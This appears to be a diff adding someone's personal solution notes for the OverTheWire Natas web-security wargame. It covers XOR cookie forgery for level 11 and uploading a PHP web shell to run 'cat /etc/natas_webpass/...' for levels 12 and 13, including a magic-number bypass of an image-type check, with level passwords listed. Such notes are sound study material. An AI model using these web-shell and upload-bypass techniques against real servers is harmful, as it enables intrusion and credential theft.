@@ -1,0 +1,35 @@
+Natas
+
+Natas teaches the basics of serverside web-security.
+
+Each level of natas consists of its own website located at http://natasX.natas.labs.overthewire.org, where X is the level number. There is no SSH login. To access a level, enter the username for that level (e.g. natas0 for level 0) and its password.
+
+Each level has access to the password of the next level. Your job is to somehow obtain that next password and level up. All passwords are also stored in /etc/natas_webpass/. E.g. the password for natas5 is stored in the file /etc/natas_webpass/natas5 and only readable by natas4 and natas5.
+
+Start here:
+
+Username: natas0
+Password: natas0
+URL:      http://natas0.natas.labs.overthewire.org
+
+
+natas11 - U82q5TCMMQ9xuFoI3dYX61s7OZD9JKoK
+
+encoded cookie
+$defaultdata = array( "showpassword"=>"no", "bgcolor"=>"#ffffff");
+setcookie("data", base64_encode(xor_encrypt(json_encode($d))));
+
+php_json = {"showpassword":"no","bgcolor":"#ffffff"}
+encoded = ClVLIh4ASCsCBE8lAxMacFMZV2hdVVotEhhUJQNVAmhSEl4sFxFdaAw
+key = 0010111001101001010100010111011001101111001111110101101101100011011101110011110001010010011011000110000101111110010100100110100100111011001110010000011101111111011110010111100001001111011101010111101100111011010010010110110000100111001000000101001001110000001100100011100001001010011100010111011100111000000011100010111001111101
+new_json = {"showpassword":"yes","bgcolor":"#ffffff"}
+key = 0010111001101001010100010111011001101111001111110101101101100011011101110011110001010010011011000110000101111110010100100110100100111011001110010000011101111111011110010111100001001111011101010111101100111011010010010110110000100111001000000101001001110000001100100011100001001010011100010111011100111000000011100010111001111101
+new_encode = ClVLIh4ASCsCBE8lAxMacFMZQGIMW1RtFxxYJgBIUnBKExssFxFdaEhf
+             ClVLIh4ASCsCBE8lAxMacFMZQGIMW1RtFxxYJgBIUnBKEBssFxFeaEhf
+
+natas12 -
+  upload shell.php and pass ?cmd=cat%20/etc/natas_webpass/natas13
+
+natas13 - jmLTY0qiPZBbaKc9341cqPQZBJv7MQbY
+  upload *new* shell.php with jpg magic number to bypass exif_imagetype()
+  and pass ?cmd=cat%20/etc/natas_webpass/natas13
